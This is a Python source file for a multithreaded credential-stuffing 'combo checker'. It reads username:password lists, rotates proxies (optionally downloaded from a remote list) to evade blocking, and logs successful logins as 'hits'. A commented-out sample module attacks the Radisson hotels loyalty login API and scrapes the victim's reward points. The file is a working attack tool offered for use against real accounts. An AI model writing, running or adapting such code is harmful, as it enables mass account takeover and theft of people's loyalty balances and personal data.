# Usage:
# python3 checkerbase.py [MODULE]                    for user interactive
# python3 checkerbase.py INPUTFILE OUTPUTFILE
# PROXYTYPE THREADCOUNT MODULE                     for CLI version
#
#
#
# OUTPUTFILE = a for automatic generate (%module-out-%i.txt)
#              FILENAME for file
#
# PROXYTYPE  = y for automatic fetch from cagriari.com
#              n for no
#              FILENAME for file


import requests
import threading
import queue
import os.path
import sys
import time
import json
import os
import importlib

if len(sys.argv) < 2:
	modulename = input("Select module: ")
else:
	modulename = sys.argv[-1]
tryLogin = importlib.import_module("checkerbase_"+modulename).tryLogin


if len(sys.argv) < 2:
	comboOk = False
	while not comboOk:
		try:
			comboFile = input("Input file: ")
			if os.path.isfile(comboFile):
				comboOk = True
			else:
				raise Exception
		except:
			print("[FATAL] Combo file {} not found".format(comboFile))
else:
	comboFile = sys.argv[1]
	if not os.path.isfile(comboFile):
		print("[FATAL] Combo file {} not found".format(comboFile))
		exit()

outfilename = "checkerbase-"+modulename+"-out.txt"
outi = 1
while os.path.isfile(outfilename):
	outfilename = "checkerbase-"+modulename+"-out-"+str(outi)+".txt"
	outi += 1

if len(sys.argv) > 2:
	if sys.argv[2] == "a":
		outFile = outfilename
	else:
		outFile = sys.argv[2]
else:
	outFile = input("Output file [{}]: ".format(outfilename))
	if outFile == "":
		outFile = outfilename


outf = open(outFile, "a")

print("[INFO] Loading combos...")
comboList = queue.Queue()
with open(comboFile, "r") as f:
	for line in f.read().splitlines():
		comboList.put(line)
print("[INFO] Combos ready")

if len(sys.argv) < 4:
	proxyState = input("Enable proxy? y/n/(c)ustom: ").lower()
	if proxyState == "":
		proxyState = "y"

	if proxyState == "c":
		proxyFile = input("Proxy file (ip:port): ")
	enableProxy = proxyState == "y" or proxyState == "c"
else:
	proxyFile = sys.argv[3]
	if proxyFile in ["y", "n"]:
		proxyState = proxyFile
	enableProxy = proxyState == "y" or proxyState == "c"
	

if enableProxy:
	print("[INFO] Loading proxies...")
	proxyList = queue.Queue()

	def loadProxies():
		global proxyList
		global proxyState
		try:
			if proxyState == "c":
				with open(proxyFile, "r") as f:
					for line in f.read().splitlines():
						proxyList.put(line)
			else:
				for line in requests.get("https://cagriari.com/fresh_proxy.txt").text.splitlines():
					if line.startswith("#") or "|" not in line:
						continue
					proxyList.put(line.split('|')[0])
		except Exception as e:
			if not killThreads:
				print("[FATAL] Proxy loading failed: " + str(e))
				killThreads = True
				exit()

	loadProxies()
	print("[INFO] {} proxies ready".format(proxyList.qsize()))


if len(sys.argv) < 5:
	threadsOk = False
	while not threadsOk:
		try:
			threads = int(input("How many threads?: "))
			if threads > 0:
				threadsOk = True
			else:
				raise Exception
		except:
			print("[ERROR] Invalid thread count")
else:
	try:
		threads = int(sys.argv[4])
	except:
		print("[FATAL] Invalid thread count")

# def tryLogin(data, proxy):
# 	username, password = data

# 	headers = {
# 	    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
# 	    'Accept': 'text/plain, */*; q=0.01',
# 	    'Accept-Language': 'en-US',
# 	    'Content-Type': 'application/json;charset=UTF-8',
# 	    'X-Requested-With': 'XMLHttpRequest',
# 	    'DNT': '1',
# 	    'Connection': 'keep-alive',
# 	    'Referer': 'https://www.radissonhotels.com/en-us/',
# 	    'TE': 'Trailers',
# 	    'X-Requested-With': 'XMLHttpRequest',
# 	}
# 	postdata = {"user":username,"password":password,"rememberMe":"false"}
# 	s = requests.session()
	
# 	loginResp = s.post("https://www.radissonhotels.com/loyalty-api/authentication", timeout=5, headers=headers, proxies=proxy, data=json.dumps(postdata))

# 	try:
# 		loginResp.headers['Authorization']
# 		try:
# 			profiledata = s.get("https://www.radissonhotels.com/en-us/radisson-rewards/secure/my-account", headers=headers, proxies=proxy, timeout=10).text
# 			points = profiledata.split('number-points')[1].split('>')[1].split('</')[0].strip()
# 			capturedata = "{} points".format(points)
# 			return (True, capturedata)
# 		except:
# 			return (True, "")
# 	except:
# 		return (False,)

killThreads = False
totalReqs = 0
started = 0
totalHits = 0
atLine = 0
def checkerThread():
	global totalReqs
	global totalHits
	global atLine
	global comboList
	currentProxy = None
	while not comboList.empty():
		if killThreads:
			return
		try:
			combo = comboList.get()
			data = combo.split(':')
			atLine += 1
			loginResp = tryLogin(data, currentProxy)
			if loginResp[0]:
				totalHits += 1
				outf.write("{} - {}\n".format(combo, loginResp[1]))
				outf.flush()
				os.fsync(outf.fileno())

			totalReqs += 1
			if totalReqs % 10 == 0:
				print("[INFO] Checking rate: {:.2f}/s, hits: {:,}, remaining: {:,}".format(totalReqs / (time.time() - started), totalHits, comboList.qsize() - totalReqs))
		except (ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError):
			comboList.put(combo)
			if not enableProxy:
				print("[ERROR] Request failed")
				time.sleep(0.5)
				continue
			else:
				time.sleep(0.5)
			if proxyList.empty():
				loadProxies()
			currentProxy = {"https":"http://"+proxyList.get(), "http":"http://"+proxyList.get()}
		except Exception as e:
			if not killThreads:
				print("[ERROR] " + str(e))
				time.sleep(0.5)

ts = []
started = time.time()

print("[INFO] Starting checker...")
for _ in range(0, threads):
	t = threading.Thread(target=checkerThread)
	t.start()
	ts.append(t)

for t in ts:
	try:
		t.join()
	except KeyboardInterrupt:
		print("[INFO] Stopping threads... (last combo line = {})".format(atLine))
		killThreads = True

print("[INFO] Stopped, last combo line {}".format(atLine))
